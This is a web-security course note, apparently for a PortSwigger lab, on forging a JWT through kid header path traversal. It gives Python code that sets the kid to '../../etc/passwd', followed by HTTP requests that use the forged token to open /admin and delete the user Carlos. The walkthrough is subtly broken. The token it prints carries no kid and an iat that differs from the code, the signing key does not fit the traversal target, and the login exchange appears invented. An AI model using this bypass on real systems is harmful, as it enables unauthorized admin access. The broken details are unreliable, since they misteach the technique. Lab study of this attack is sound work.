---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Crafting the Malicious JWT

To craft a malicious JWT, you need to understand the structure of the JWT and how the `kid` header is used. Here is a step-by-step guide to crafting the JWT:

1. **Identify the Endpoint**: Determine the endpoint that accepts JWTs for authentication.
2. **Craft the Payload**: Create a payload that includes necessary claims for authentication.
3. **Manipulate the Kid Header**: Set the `kid` header to a value that points to a sensitive file on the server's filesystem.
4. **Generate the JWT**: Use a JWT library to generate the token with the manipulated `kid` value.

### Example Code to Craft the JWT

Here is an example Python code to craft the JWT:

```python
import jwt

# Define the payload
payload = {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022,
    "iss": "https://example.com",
    "aud": "https://example.com/admin"
}

# Define the header with a manipulated kid value
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../etc/passwd"
}

# Generate the JWT
token = jwt.encode(payload, "secret", algorithm="HS256", headers=header)

print(token)
```

### Full HTTP Request and Response

Here is an example of the full HTTP request and response:

#### HTTP Request

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "your_username",
  "password": "your_password",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9leGFtcGxlLmNvbS9hZG1pbiJ9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFQKMhU5Zk"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9leGFtcGxlLmNvbS9hZG1pbiJ9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFQKMhU5Zk"
}
```

### Using the Crafted JWT

Once you have the crafted JWT, you can use it to access the admin panel and delete the user "Carlos."

#### HTTP Request to Admin Panel

```http
GET /admin HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9leGFtcGxlLmNvbS9hZG1pbiJ9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFQKMhU5Zk
```

#### HTTP Response from Admin Panel

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Welcome to the admin panel",
  "users": [
    {"id": 1, "name": "John Doe"},
    {"id": 2, "name": "Carlos"}
  ]
}
```

### Deleting the User "Carlos"

To delete the user "Carlos," you can send a DELETE request to the appropriate endpoint.

#### HTTP Request to Delete User

```http
DELETE /admin/users/2 HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwiYXVkIjoiaHR0cHM6Ly9leGFtcGxlLmNvbS9hZG1pbiJ9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFQKMhU5Zk
```

#### HTTP Response from Deleting User

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "User deleted successfully"
}
```

---
<!-- nav -->
[[04-JWT Overview|JWT Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/06-Lab 6 JWT authentication bypass via kid header path traversal/00-Overview|Overview]] | [[06-How to Prevent  Defend Against JWT Authentication Bypass|How to Prevent  Defend Against JWT Authentication Bypass]]
